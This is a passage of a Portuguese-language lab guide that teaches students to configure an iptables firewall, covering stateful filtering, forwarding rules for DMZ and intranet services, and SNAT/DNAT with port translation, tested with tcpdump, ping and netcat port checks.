<div class="literalblock">
<div class="content">
<pre># tcpdump -i enp0s3 -n src 192.168.29.107 or dst 192.168.29.107
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on enp0s3, link-type EN10MB (Ethernet), capture size 262144 bytes
21:52:28.135864 IP 192.168.29.107.33147 &gt; 8.8.8.8.53: 48302+ A? obsd3.srv.ualberta.ca. (39)
21:52:28.215508 IP 8.8.8.8.53 &gt; 192.168.29.107.33147: 48302 1/0/0 A 129.128.5.194 (55)</pre>
</div>
</div>
</li>
<li>
<p>Finalmente, crie uma regra apropriada na <em>chain</em> INPUT e teste o sucesso na conexão HTTP.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -p tcp --sport 80 -j ACCEPT
# iptables -A INPUT -p udp --sport 53 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
<div class="paragraph">
<p>Note que devemos usar <code>--sport</code> (<em>source port</em>) ao invés de <code>--dport</code> (<em>destination port</em>), como feito anteriormente na regra da <em>chain</em> OUTPUT.</p>
</div>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_2_firewall_stateful">2) Firewall <strong><em>stateful</em></strong></h3>
<div class="paragraph">
<p>Não é conveniente nem manutenível criar regras como fizemos na atividade (1)&#8201;&#8212;&#8201;para cada regra de saída, ter que existir uma regra de entrada correspondente. Podemos usar a capacidade do <code>iptables</code> de monitorar estados de conexões a nosso favor, já que ele é um firewall <em>stateful</em>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Remova as regras da chain INPUT. Em seguida crie uma regra genérica que permita que conexões estabelecidas sejam autorizadas através do firewall. Em seguida, tente estabelecer uma conexão HTTP. Foi possível?</p>
<div class="literalblock">
<div class="content">
<pre># iptables -F INPUT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -m state --state ESTABLISHED -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -L
Chain INPUT (policy DROP)
target     prot opt source               destination
ACCEPT     all  --  anywhere             anywhere             state ESTABLISHED

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy DROP)
target     prot opt source               destination
ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
ACCEPT     udp  --  anywhere             anywhere             udp dpt:domain</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
</li>
<li>
<p>Qual seria, então, a diferença entre filtros de pacotes <em>stateless</em> e <em>stateful</em>?</p>
</li>
</ol>
</div>
</div>
<div class="sect2">
<h3 id="_3_configurando_o_firewall_fwgw1_g_tabela_filter">3) Configurando o firewall <strong><em>FWGW1-G</em></strong>: tabela <strong><em>filter</em></strong></h3>
<div class="paragraph">
<p>A partir desta atividade o roteiro está dividido em duas grandes partes. Na primeira, o aluno programará um controle de pacotes para permitir a comunicação entre os <em>hosts</em> descritos na topologia do laboratório. Na segunda parte, programará a tradução de pacotes. Se precisar, retorne à imagem constante da atividade (2) da sessão 1&#8201;&#8212;&#8201;Configuração preliminar das máquinas.</p>
</div>
<div class="paragraph">
<p>A tabela a seguir mostra uma listagem com a descrição dos serviços a serem disponibilizados pelos servidores da DMZ, cuja permissão de acesso será configurada nas atividades a seguir.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 8. Serviços de rede disponíveis na DMZ</caption>
<colgroup>
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Servidor</th>
<th class="tableblock halign-left valign-top">Serviço</th>
<th class="tableblock halign-left valign-top">Protocolo</th>
<th class="tableblock halign-left valign-top">Porta</th>
<th class="tableblock halign-left valign-top">Descrição</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">SSH</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">22</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Serviço de login remoto</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Postfix</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">25</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de mensagens</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Apache</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de páginas web</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Courier</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">110</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor POP3</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">PostgreSQL</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">5432</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de banco de dados</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Bind</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">53</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor DNS</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">NTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de hora</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">FTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">21</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de arquivos</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">IIS</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de páginas web</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">IIS</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">443</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de páginas web</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">RDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">3389</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Serviço de conexão remota</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">NTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Servidor de hora</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>A realização desta atividade é fundamental para a realização das demais atividades deste curso.
A política de filtro de pacotes será a mais restritiva possível, permitindo somente as conexões previamente definidas no firewall. Dessa forma, a política padrão é negar todos os pacotes que chegarem, saírem e/ou atravessarem o firewall.</p>
</div>
<div class="paragraph">
<p>A cada item será necessário verificar a configuração corrente do firewall. Para listar as regras das tabelas <em>input</em> e <em>nat</em> do firewall, respectivamente, use os comandos:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -L -vn
# iptables -t nat -L -vn</pre>
</div>
</div>
<div class="paragraph">
<p>Caso cometa um erro, você pode apagar todas as regras das tabelas <em>input</em> e <em>nat</em> do firewall, respectivamente, com os comandos:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -F
# iptables -t nat -F</pre>
</div>
</div>
<div class="paragraph">
<p>Use o comando <code>tcpdump</code> para testar o funcionamento de suas regras.</p>
</div>
<div class="sect3">
<h4 id="_1_configuração_preliminar">1) Configuração preliminar</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>O primeiro passo, antes de mesmo começar a mexer no firewall, é ter uma maneira de gravar suas regras. Iremos instalar o pacote <code>iptables-persistent</code> para atingir esse objetivo; mas, antes de começar, garanta que seu firewall não possui regras e que as políticas de entrada/saída são permissivas:</p>
<div class="literalblock">
<div class="content">
<pre># iptables -P INPUT ACCEPT
# iptables -P OUTPUT ACCEPT
# iptables -F</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -L
Chain INPUT (policy ACCEPT)
target     prot opt source               destination

Chain FORWARD (policy ACCEPT)
target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
target     prot opt source               destination</pre>
</div>
</div>
</li>
<li>
<p>Agora, instale o pacote <code>iptables-persistent</code> para tornar suas configurações de firewall permanentes mesmo após o <code>reboot</code> da máquina.</p>
<div class="literalblock">
<div class="content">
<pre># apt-get install iptables-persistent</pre>
</div>
</div>
<div class="paragraph">
<p>Na instalação do pacote, quando perguntado, responda:</p>
</div>
<table class="tableblock frame-all grid-all" style="width: 65%;">
<caption class="title">Table 9. Configurações do iptables-persistent</caption>
<colgroup>
<col style="width: 50%;">
<col style="width: 50%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Pergunta</th>
<th class="tableblock halign-left valign-top">Resposta</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Salvar as regras IPv4 atuais?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Sim</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">Salvar as regras IPv6 atuais?</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Sim</p></td>
</tr>
</tbody>
</table>
</li>
<li>
<p>Isso feito, basta dar início ao processo de configuração do firewall. Ao inserir um conjunto de regras com as quais você esteja satisfeito, é possível gravá-las de forma fácil com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># iptables-save &gt; /etc/iptables/rules.v4</pre>
</div>
</div>
</li>
<li>
<p>Se cometer qualquer erro durante o processo de configuração, você pode recarregar o conjunto de regras salvo no arquivo <code>/etc/iptables/rules.v4</code> com o comando:</p>
<div class="literalblock">
<div class="content">
<pre># systemctl restart netfilter-persistent.service</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_2_configuração_do_acesso_ao_firewall">2) Configuração do acesso ao firewall</h4>
<div class="paragraph">
<p>Vamos primeiramente permitir acesso administrativo ao firewall por SSH, bem como pacotes ICMP para testes de conectividades.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Primeiro, torne as políticas do firewall restritivas, ajustando a política das <em>chains</em> INPUT e FORWARD para DROP.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -P INPUT DROP
# iptables -P FORWARD DROP</pre>
</div>
</div>
</li>
<li>
<p>Teste o funcionamento do firewall. Na máquina <em>LinServer</em>, por exemplo, tente enviar um pacote ICMP para a máquina <em>FWGW1-G</em>.</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ping -c1 172.16.1.1
PING 172.16.1.1 (172.16.1.1) 56(84) bytes of data.

--- 172.16.1.1 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms</pre>
</div>
</div>
</li>
<li>
<p>Agora, adicione as seguintes regras ao firewall:</p>
<div class="openblock">
<div class="content">
<div class="ulist">
<ul>
<li>
<p>Permita todo o tráfego na interface <em>loopback</em>, e rejeitar qualquer pacote vindo da rede 127.0.0.0/8 que não seja para a interface <code>lo</code> com <code>icmp-port-unreachable</code></p>
</li>
<li>
<p>Permita conexões destinadas ao firewall (<em>chain</em> INPUT) cujo estado seja relacionado ou estabelecido.</p>
</li>
<li>
<p>Permita gerência via <code>ssh</code> do firewall <em>FWGW1-G</em> a partir de máquinas da Intranet.</p>
</li>
<li>
<p>Permita que pacotes ICMP oriundos das redes DMZ/Intranet cheguem ao firewall <em>FWGW1-G</em>.</p>
</li>
</ul>
</div>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A INPUT -i lo -j ACCEPT
# iptables -A INPUT -d 127.0.0.0/8 -i '!lo' -j REJECT --reject-with icmp-port-unreachable
# iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
# iptables -A INPUT -s 10.1.1.0/24 -p tcp -m tcp --dport 22 -m state --state NEW,ESTABLISHED -j ACCEPT
# iptables -A INPUT -s 172.16.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT
# iptables -A INPUT -s 10.1.1.0/24 -p icmp -m icmp --icmp-type any -j ACCEPT</pre>
</div>
</div>
</li>
<li>
<p>Realize o teste de conexão do passo (2) novamente, e verifique que suas configurações funcionaram.</p>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ ping -c1 172.16.1.1
PING 172.16.1.1 (172.16.1.1) 56(84) bytes of data.
64 bytes from 172.16.1.1: icmp_seq=1 ttl=64 time=0.235 ms

--- 172.16.1.1 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.235/0.235/0.235/0.000 ms</pre>
</div>
</div>
</li>
<li>
<p>Se quiser, use o PuTTY (<a href="https://www.putty.org/" class="bare">https://www.putty.org/</a>) ou Cygwin (<a href="http://www.cygwin.com/" class="bare">http://www.cygwin.com/</a>), nas máquinas <em>WinClient-G</em> ou sua máquina física, para conectar-se à máquina <em>FWGW1-G</em> e testar sua configuração.</p>
<div class="paragraph">
<p>Abaixo, temos um exemplo de conexão a partir da máquina física usando Cygwin/x64 para o <em>host</em> <em>FWGW1-G</em>, via SSH.</p>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@LOCAL-PC ~
$ uname
CYGWIN_NT-10.0</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>fbs@LOCAL-PC ~
$ ssh aluno@10.1.1.1
No mail.
Last login: Sun Aug 19 22:30:33 2018 from 10.1.1.254</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ whoami
aluno</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
FWGW1-A</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_3_configuração_do_acesso_intranet_dmz">3) Configuração do acesso Intranet &gt; DMZ</h4>
<div class="paragraph">
<p>Agora, vamos configurar o firewall para permitir pacotes originados na Intranet que atravessem o firewall com destino aos serviços da DMZ. Verifique a lista de serviços a serem permitidos na tabela 7&#8201;&#8212;&#8201;"Serviços de rede disponíveis na DMZ".</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que o serviços da tabela referenciada acima possam ser acessados a partir da Intranet.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p tcp -m multiport --dports 22,25,80,110,5432 -j ACCEPT
# iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443,3389 -j ACCEPT
# iptables -A FORWARD -s 10.1.1.0/24 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT</pre>
</div>
</div>
</li>
<li>
<p>Teste sua configuração acessando o servidor web IIS instalado na máquina <em>WinServer-G</em>, e acessando-o a partir da máquina <em>WinClient-G</em>.</p>
<div id="img-fwd-iis-ok" class="imageblock" style="text-align: center">
<div class="content">
<img src="./img/firewall-fwd-iis-ok.png" alt="firewall fwd iis ok">
</div>
<div class="title">Figure 43. Acesso da Intranet para a DMZ</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_4_configuração_do_acesso_dmzintranet_internet">4) Configuração do acesso DMZ/Intranet &gt; Internet</h4>
<div class="paragraph">
<p>Agora, vamos configurar o acesso da DMZ e Intranet para a Internet. Para isso, teremos que permitir que pacotes originados nessas redes atravessem o firewall via interface de rede <em>outbound</em>.</p>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que as redes DMZ e Intranet possam acessar qualquer serviço na Internet, via quaisquer protocolos.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -s 172.16.1.0/24 -o enp0s3 -j ACCEPT
# iptables -A FORWARD -s 10.1.1.0/24   -o enp0s3 -j ACCEPT</pre>
</div>
</div>
</li>
<li>
<p>Teste sua configuração acessando uma página da Internet a partir da máquina <em>LinServer-G</em>.</p>
<div class="paragraph">
<p>Observe que, se a regra de <code>MASQUERADE</code> inserida através do arquivo <code>/etc/rc.local</code> durante o <em>boot</em> do sistema tiver sido removida durante a atividade (3) desta seção (comando <code>iptables -t nat -F</code>), o acesso acima não irá funcionar. Iremos reconfigurar regras que viabilizem a conexão logo a seguir, na atividade (4.1).</p>
</div>
<div class="literalblock">
<div class="content">
<pre>$ hostname
LinServer-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre>$ nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_5_configuração_do_acesso_internet_dmz">5) Configuração do acesso Internet &gt; DMZ</h4>
<div class="paragraph">
<p>Finalmente, o último passo é permitir que requisições vindas da Internet possam acessar alguns serviços publicados pela DMZ.</p>
</div>
<div class="paragraph">
<p>Como dois serviços das máquinas <em>LinServer-G</em> e <em>WinServer-G</em> operam nas mesmas portas (80/TCP e 123/UDP), teremos que fazer uma técnica de PAT (<em>port address translation</em>) para que ambos possam ser atingidos. O primeiro passo será feito aqui, nas regras da <em>chain</em> FORWARD; na próxima atividade, em que configuraremos o DNAT, será realizada a parte de tradução de portas.</p>
</div>
<table class="tableblock frame-all grid-all stretch">
<caption class="title">Table 10. Serviços publicados pela DMZ para a Internet</caption>
<colgroup>
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
<col style="width: 20%;">
</colgroup>
<thead>
<tr>
<th class="tableblock halign-left valign-top">Servidor</th>
<th class="tableblock halign-left valign-top">Serviço</th>
<th class="tableblock halign-left valign-top">Protocolo</th>
<th class="tableblock halign-left valign-top">Porta do serviço</th>
<th class="tableblock halign-left valign-top">Porta Internet</th>
</tr>
</thead>
<tbody>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Postfix</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">25</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">25</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Apache</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Courier</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">110</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">110</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">Bind</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">53</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">53</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">LinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">NTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">FTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">21</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">21</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">IIS</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">80</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">8080</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">IIS</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">TCP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">443</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">443</p></td>
</tr>
<tr>
<td class="tableblock halign-left valign-top"><p class="tableblock">WinServer-G</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">NTP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">UDP</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">123</p></td>
<td class="tableblock halign-left valign-top"><p class="tableblock">8123</p></td>
</tr>
</tbody>
</table>
<div class="paragraph">
<p>O teste deste configuração será feito na próxima atividade, em que configuraremos o NAT.</p>
</div>
<div class="admonitionblock warning">
<table>
<tr>
<td class="icon">
<i class="fa icon-warning" title="Warning"></i>
</td>
<td class="content">
<div class="paragraph">
<p>As regras de DNAT que inseriremos na atividade a seguir entrarão na <em>chain</em> PREROUTING, ou pré-roteamento. Isso significa dizer que os números de porta Internet mostrados acima serão traduzidos para os números das porta de serviço <strong>ANTES</strong> que as regras da <em>chain</em> FORWARD sejam processadas.</p>
</div>
<div class="paragraph">
<p>Tenha isso em mente ao decidir quais números de porta utilizar nas regras de repasse deste exercício.</p>
</div>
</td>
</tr>
</table>
</div>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Adicione regras à <em>chain</em> FORWARD da tabela <em>filter</em> que permitam que a Internet consiga acessar os serviços publicados pelas máquinas da DMZ, de acordo com as especificações acima.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
FWGW1-A</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -A FORWARD -i enp0s3 -d 172.16.1.10/32 -p tcp -m multiport --dports 25,80,110 -j ACCEPT
# iptables -A FORWARD -i enp0s3 -d 172.16.1.10/32 -p udp -m multiport --dports 53,123 -j ACCEPT
# iptables -A FORWARD -i enp0s3 -d 172.16.1.20/32 -p tcp -m multiport --dports 21,80,443 -j ACCEPT
# iptables -A FORWARD -i enp0s3 -d 172.16.1.20/32 -p udp -m multiport --dports 123 -j ACCEPT</pre>
</div>
</div>
<div class="paragraph">
<p>Como a tradução dos números de porta já terá sido realizado quando as regras acima forem processadas, devemos utilizar os número de porta internos (ou de serviço, de acordo com a tabela) na configuração das regras de <em>forward</em>.</p>
</div>
</li>
</ol>
</div>
</div>
</div>
<div class="sect2">
<h3 id="_4_configurando_o_firewall_fwgw1_g_tabela_nat">4) Configurando o firewall <strong><em>FWGW1-G</em></strong>: tabela <strong><em>nat</em></strong></h3>
<div class="paragraph">
<p>O principal objetivo desta atividade é demonstrar o entendimento do funcionamento dos tipos de NAT e aplicá-los em uma simulação de caso real.</p>
</div>
<div class="paragraph">
<p>Utilizando os conceitos aprendidos, será necessário configurar o NAT no firewall <em>FWGW1-G</em> para permitir que as máquinas da rede local e da DMZ consigam acessar a Internet. Também será necessária a configuração do NAT para publicação dos serviços da DMZ para a Internet.</p>
</div>
<div class="sect3">
<h4 id="_1_configuração_do_snat_dmzintranet_internet">1) Configuração do SNAT: DMZ/Intranet &gt; Internet</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Antes de configurar o SNAT para acesso DMZ/Intranet &gt; Internet, será necessário remover a configuração de <em>masquerading</em> preexistente, que fizemos na sessão 1. Edite o arquivo <code>/etc/rc.local</code> e remova ou comente a linha:</p>
<div class="literalblock">
<div class="content">
<pre>iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># sed -i 's/\(iptables -t nat -A POSTROUTING -o enp0s3 -j MASQUERADE\)/#\1/' /etc/rc.local</pre>
</div>
</div>
</li>
<li>
<p>Da mesma forma, remova essa regra do firewall, já que configuraremos outras regras, mais específicas, em seu lugar a seguir.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -L POSTROUTING -vn --line-number
Chain POSTROUTING (policy ACCEPT 2 packets, 104 bytes)
num   pkts bytes target     prot opt in     out     source               destination
1       70  5922 MASQUERADE  all  --  *      enp0s3    0.0.0.0/0            0.0.0.0/0</pre>
</div>
</div>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -D POSTROUTING 1</pre>
</div>
</div>
</li>
<li>
<p>Agora sim, tudo pronto. Insira uma regra no firewall que faça tradução dos endereços das redes DMZ/Intranet via <em>masquerading</em>, permitindo assim seu acesso à Internet.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A POSTROUTING -s 172.16.1.0/24 -o enp0s3 -j MASQUERADE
# iptables -t nat -A POSTROUTING -s 10.1.1.0/24 -o enp0s3 -j MASQUERADE</pre>
</div>
</div>
</li>
<li>
<p>Teste sua configuração. Acesse, por exemplo, a máquina <em>LinServer-G</em> e tente acessar um site na Internet.</p>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# nc -z -w5 -v obsd3.srv.ualberta.ca 80
obsd3.srv.ualberta.ca [129.128.5.194] 80 (http) open</pre>
</div>
</div>
</li>
</ol>
</div>
</div>
<div class="sect3">
<h4 id="_2_configuração_do_dnat_internet_dmz">2) Configuração do DNAT: Internet &gt; DMZ</h4>
<div class="olist arabic">
<ol class="arabic">
<li>
<p>Agora, vamos configurar o DNAT, que irá permitir acesso pela Internet aos serviços publicados pela DMZ. Comece fazendo as regras para a máquina <em>LinServer-G</em>, que não exige PAT.</p>
<div class="literalblock">
<div class="content">
<pre># iptables -t nat -A PREROUTING -i enp0s3 -p tcp -m multiport --dports 25,80,110 -j DNAT --to-destination 172.16.1.10
# iptables -t nat -A PREROUTING -i enp0s3 -p udp -m multiport --dports 53,123 -j DNAT --to-destination 172.16.1.10</pre>
</div>
</div>
</li>
<li>
<p>Agora, teste sua configuração. Primeiro, instale o servidor web Apache na máquina <em>LinServer-G</em>; a seguir, em sua máquina física, acesso o IP público da máquina <em>FWGW1-G</em> na porta 80/TCP e verifique que de fato é exibida no navegador a página web instalada no <em>LinServer-G</em>.</p>
<div class="paragraph">
<p>Primeiro, vamos instalar o servidor web Apache na máquina <em>LinServer-G</em>:</p>
</div>
<div class="literalblock">
<div class="content">
<pre># hostname
LinServer-A

# apt-get install --no-install-recommends apache2</pre>
</div>
</div>
<div class="paragraph">
